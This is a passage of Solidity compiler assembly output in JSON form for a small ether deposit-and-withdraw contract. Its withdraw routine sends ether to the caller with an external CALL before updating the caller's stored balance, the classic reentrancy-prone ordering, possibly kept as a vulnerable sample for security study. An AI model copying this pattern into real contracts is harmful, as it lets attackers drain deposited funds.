											"end": 340,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "AND"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "ADD"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "SWAP3"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "SWAP2"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "SWAP1"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "STOP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "JUMPDEST"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP2"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "ADD"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "AND"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "ADD"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP3"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP2"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "JUMPDEST"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "MLOAD"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP3"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP2"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "MSTORE"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "ADD"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP2"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "MLOAD"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP2"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SUB"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "RETURN"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "JUMPDEST"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "POP"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "DUP1"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "DUP2"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "ADD"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "SWAP1"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "DUP1"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "DUP1"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "SWAP1"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "ADD"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "SWAP1"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "SWAP3"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "SWAP2"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "SWAP1"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "POP"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "POP"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "POP"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "JUMPDEST"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "STOP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "JUMPDEST"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP2"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "ADD"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "AND"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "ADD"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP3"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP2"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "JUMPDEST"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "MLOAD"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP3"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP2"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "MSTORE"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "ADD"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP2"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "POP"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "MLOAD"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "DUP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP2"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SUB"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "SWAP1"
										},
										{
											"begin": 344,
											"end": 444,
											"name": "RETURN"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 325,
											"end": 334,
											"name": "CALLVALUE"
										},
										{
											"begin": 307,
											"end": 315,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "DUP1"
										},
										{
											"begin": 316,
											"end": 319,
											"name": "DUP5"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "AND"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "AND"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "MSTORE"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "ADD"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "MSTORE"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "ADD"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "KECCAK256"
										},
										{
											"begin": 307,
											"end": 320,
											"name": "SLOAD"
										},
										{
											"begin": 307,
											"end": 324,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 307,
											"end": 324,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "SWAP2"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "AND"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 307,
											"end": 335,
											"name": "JUMPDEST"
										},
										{
											"begin": 291,
											"end": 299,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "DUP1"
										},
										{
											"begin": 300,
											"end": 303,
											"name": "DUP4"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "AND"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "AND"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "DUP2"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "MSTORE"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "ADD"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "DUP2"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "MSTORE"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "ADD"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 291,
											"end": 304,
											"name": "KECCAK256"
										},
										{
											"begin": 291,
											"end": 335,
											"name": "DUP2"
										},
										{
											"begin": 291,
											"end": 335,
											"name": "SWAP1"
										},
										{
											"begin": 291,
											"end": 335,
											"name": "SSTORE"
										},
										{
											"begin": 291,
											"end": 335,
											"name": "POP"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "POP"
										},
										{
											"begin": 241,
											"end": 340,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "JUMPDEST"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "MSTORE"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "MSTORE"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "KECCAK256"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP2"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SWAP1"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "POP"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "SLOAD"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "DUP2"
										},
										{
											"begin": 196,
											"end": 236,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 448,
											"end": 682,
											"name": "JUMPDEST"
										},
										{
											"begin": 520,
											"end": 527,
											"name": "DUP1"
										},
										{
											"begin": 496,
											"end": 504,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "DUP1"
										},
										{
											"begin": 505,
											"end": 515,
											"name": "CALLER"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "AND"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "AND"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "DUP2"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "MSTORE"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "ADD"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "SWAP1"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "DUP2"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "MSTORE"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "ADD"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "KECCAK256"
										},
										{
											"begin": 496,
											"end": 516,
											"name": "SLOAD"
										},
										{
											"begin": 496,
											"end": 527,
											"name": "LT"
										},
										{
											"begin": 493,
											"end": 678,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 493,
											"end": 678,
											"name": "JUMPI"
										},
										{
											"begin": 538,
											"end": 549,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 554,
											"end": 564,
											"name": "CALLER"
										},
										{
											"begin": 554,
											"end": 569,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 554,
											"end": 569,
											"name": "AND"
										},
										{
											"begin": 576,
											"end": 583,
											"name": "DUP3"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "MLOAD"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "DUP1"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "ADD"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "SWAP1"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "POP"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "MLOAD"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "DUP1"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "DUP4"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "SUB"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "DUP2"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "DUP6"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "DUP8"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "GAS"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "CALL"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "SWAP3"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "POP"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "POP"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "POP"
										},
										{
											"begin": 554,
											"end": 588,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 12,
											"end": 13,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 20,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "DUP2"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "EQ"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "PUSH [tag]",
											"value": "31"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPI"
										},
										{
											"begin": 67,
											"end": 71,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 61,
											"end": 72,
											"name": "MLOAD"
										},
										{
											"begin": 56,
											"end": 72,
											"name": "SWAP2"
										},
										{
											"begin": 56,
											"end": 72,
											"name": "POP"
										},
										{
											"begin": 134,
											"end": 138,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 130,
											"end": 139,
											"name": "NOT"
										},
										{
											"begin": 123,
											"end": 127,
											"name": "PUSH",
											"value": "3F"
										},
										{
											"begin": 105,
											"end": 121,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 101,
											"end": 128,
											"name": "ADD"
										},
										{
											"begin": 97,
											"end": 140,
											"name": "AND"
										},
										{
											"begin": 94,
											"end": 95,
											"name": "DUP3"
										},
										{
											"begin": 90,
											"end": 141,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 88,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 77,
											"end": 142,
											"name": "MSTORE"
										},
										{
											"begin": 157,
											"end": 173,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 154,
											"end": 155,
											"name": "DUP3"
										},
										{
											"begin": 147,
											"end": 174,
											"name": "MSTORE"
										},
										{
											"begin": 211,
											"end": 227,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 208,
											"end": 209,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 201,
											"end": 205,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 198,
											"end": 199,
											"name": "DUP5"
										},
										{
											"begin": 194,
											"end": 206,
											"name": "ADD"
										},
										{
											"begin": 179,
											"end": 228,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "PUSH [tag]",
											"value": "30"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMP"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 14,
											"end": 41,
											"name": "JUMPDEST"
										},
										{
											"begin": 32,
											"end": 36,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "SWAP2"
										},
										{
											"begin": 27,
											"end": 36,
											"name": "POP"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "JUMPDEST"
										},
										{
											"begin": 5,
											"end": 233,
											"name": "POP"
										},
										{
											"begin": 537,
											"end": 588,
											"name": "POP"
										},
										{
											"begin": 537,
											"end": 588,
											"name": "SWAP1"
										},
										{
											"begin": 537,
											"end": 588,
											"name": "POP"
										},
										{
											"begin": 664,
											"end": 671,
											"name": "DUP2"
										},
										{
											"begin": 640,
											"end": 648,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "DUP1"
										},
										{
											"begin": 649,
											"end": 659,
											"name": "CALLER"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "AND"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "AND"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "DUP2"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "MSTORE"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "ADD"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "SWAP1"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "DUP2"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "MSTORE"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "ADD"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "KECCAK256"
										},
										{
											"begin": 640,
											"end": 660,
											"name": "PUSH",
											"value": "0"
										},
										{
